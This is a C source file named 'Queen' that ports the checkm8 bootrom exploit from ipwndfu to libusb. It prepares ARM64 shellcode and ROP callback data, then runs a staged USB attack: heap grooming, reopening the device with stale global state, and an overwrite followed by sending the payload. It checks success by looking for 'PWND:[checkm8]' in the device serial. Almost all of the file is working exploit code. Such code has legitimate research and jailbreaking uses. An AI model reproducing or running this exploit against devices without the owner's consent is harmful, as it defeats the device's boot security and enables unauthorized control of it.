/*
* Queen - Checkm8, but in C
*   Built on libusb
* 
* Based on checkm8.py in ipwndfu by axiomX
*/

#include <assert.h>
#include <stdalign.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <libusb-1.0/libusb.h>

#include "config.h"
#include "dfu.h"
#include "util.h"

#ifdef _WIN32
#include <windows.h>
#elif _POSIX_C_SOURCE >= 199309L
#include <time.h> // for nanosleep
#else
#include <unistd.h> // for usleep
#endif

// credit pgarba
void sleep_ms(int milliseconds) { // cross-platform sleep function
#ifdef WIN32
  Sleep(milliseconds);
#elif _POSIX_C_SOURCE >= 199309L
  struct timespec ts;
  ts.tv_sec = milliseconds / 1000;
  ts.tv_nsec = (milliseconds % 1000) * 1000000;
  nanosleep(&ts, NULL);
#else
  usleep(milliseconds * 1000);
#endif
}

int exploit() {
    printf("[x] *** checkm8 exploit by axi0mX ***\n");

    int status = 0;
    uint8_t* a800 = malloc(0x800);
    memset(a800, 'A', 0x800);

    printf("[x]\tPreparing shellcode...\n");
    
    payload_config payload_cfg = get_config(8015);
    v8 shellcode = prepare_shellcode("checkm8_arm64", &payload_cfg.constants_checkm8);
    v8 final_shellcode = v8_new(shellcode.size);
    v8 callback_data = usb_rop_callbacks(0x18001C020, payload_cfg.func_gadget, payload_cfg.callbacks);
    v8 handler = v8_new(3);
    v8_append(&handler, asm_arm64_x7_trampoline(payload_cfg.handle_interface_request));
    v8_push(&handler, asm_arm64_branch(0x10, 0x0));
    v8 usb_shellcode = prepare_shellcode("usb_0xA1_2_arm64", &payload_cfg.constants_usb);
    v8_append(&handler, v8_range_of(&usb_shellcode, 4, 4));

    assert(shellcode.size <= PAYLOAD_OFFSET_ARM64);
    assert(handler.size <= PAYLOAD_SIZE_ARM64);

    if (shellcode.size < PAYLOAD_OFFSET_ARM64) {
        v8_append(&shellcode, v8_zeros(PAYLOAD_OFFSET_ARM64 - shellcode.size));
    }
    
    v8_append(&shellcode, handler);

    /*
        struct.pack('<6Q16x448s1536x1024s', 
            0x180020400-8, 0x1000006A5, 
            0x180020600-8, 0x180000625, 
            0x18000C600-8, 0x180000625, 
            t8015_callback_data, t8015_shellcode)

        0x30 uint64_t + 0x10 pad bytes + 0x1C0 callback data + 0x600 pad bytes + 0x400 shellcode 
    */

    v64 addrs = v64_new(6);
    v64_push(&addrs, 0x180020400-8);
    v64_push(&addrs, 0x1000006A5);
    v64_push(&addrs, 0x180020600-8);
    v64_push(&addrs, 0x180000625);
    v64_push(&addrs, 0x18000C600-8);
    v64_push(&addrs, 0x180000625);
    // TODO: free(addrs);

    // Aligning final shellcode we will transfer to device
    v8_append(&final_shellcode, v64_convert_v8(addrs)); // 6Q    (0x30)
    v8_append(&final_shellcode, v8_zeros(0x10));        // 16x   (0x10)
    v8_append(&final_shellcode, callback_data);         // 448s  (0x1C0)
    v8_append(&final_shellcode, v8_zeros(0x600));       // 1536x (0x600)
    v8_append(&final_shellcode, shellcode);             // 1024s (0x400)

    // DEBUG
    printf("\tmain:\n\t\tfinal_shellcode.size: 0x%03x\n", final_shellcode.size);

    v8 overwrite = create_overwrite(0x10000A9C4, 0x18001C020);

    aquire_device();

    printf("[x]\tStage1: Heap feng-shui...\n");    

    // t8015: large_leak=None, hole=6, leak=1
    stall();
    for (int i = 0; i < 6; i++) {
        no_leak();
    }
    usb_req_leak();
    no_leak();

    reset_device();
    release_device();

    printf("[x]\tStage2: Reopening device without clearing global vars...\n");
    aquire_device();
    async_ctrl_transfer(0x21, 1, 0, 0, a800, 0.0001);
    no_error_ctrl_transfer(0x21, 4, 0, 0, 0, 0, 0);
    release_device();

    sleep_ms(500);

    printf("[x]\tStage3: Exploiting...\n");
    
    aquire_device();
    usb_req_stall();
    usb_req_leak();
    no_error_ctrl_transfer(0, 0, 0, 0, overwrite.data, overwrite.size, 100);
    for (int i = 0; i < final_shellcode.size; i += 0x800) {
        uint8_t* data_chunk = malloc(0x800);
        memcpy(data_chunk, &final_shellcode.data[i], 0x800);
        async_ctrl_transfer(0x21, 1, 0, 0, data_chunk, 100);
        free(data_chunk);
    }

    reset_device();
    release_device();
    aquire_device();

    if(strstr(get_serial_string(), "PWND:[checkm8]") == NULL) {
        printf("Exploit failed");
        exit(EXIT_FAILURE);
    }

    return status;
}

int main(int argc, char const *argv[])
{
    int status = 0;
    init_ctx();

    if (argc > 1) {
        for (int i = 1; i < argc; i++) {
            switch (argv[i][1])
            {
                case 'p':
                    status = exploit();
                    break;

                case 'D':
                    // Debug
                    break;
                
                default:
                    printf("Usage:\tqueen [option]\n");
                    exit(EXIT_FAILURE);
            }
        }
    }

    return status;
}
